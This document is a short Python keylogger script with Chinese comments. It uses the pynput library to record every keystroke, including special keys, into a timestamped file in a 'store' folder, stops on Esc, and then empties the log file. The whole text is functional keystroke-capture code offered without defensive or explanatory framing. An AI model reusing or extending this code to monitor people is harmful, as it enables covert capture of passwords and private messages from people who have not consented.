# -*- coding: utf-8 -*-
import os
from pynput import keyboard
from datetime import datetime

# 定义store文件夹
store_folder = "store"

# 获取当前脚本的目录
script_dir = os.getcwd()

# 创建store文件夹的完整路径
store_path = os.path.join(script_dir, store_folder)

# 如果store文件夹不存在，则创建它
if not os.path.exists(store_path):
    os.makedirs(store_path)

# 使用当前时间生成文件名
timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
filename = f"keylog_{timestamp}.txt"

# 定义keylog文件的完整路径
keylog_path = os.path.join(store_path, filename)

# 键盘按下事件
def on_press(key):
    try:
        with open(keylog_path, 'a') as file:  # 'a'模式表示追加
            file.write(f'{key.char}\n')  # 写入按键字符
    except AttributeError:
        with open(keylog_path, 'a') as file:  # 'a'模式表示追加
            file.write(f'[Special Key: {key}]\n')  # 写入特殊键名称

# 键盘释放事件
def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # 停止监听器
        return False

# 创建并启动键盘监听器
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# 清空keylog文件内容
with open(keylog_path, 'w') as file:
    file.write("")  # 清空文件内容
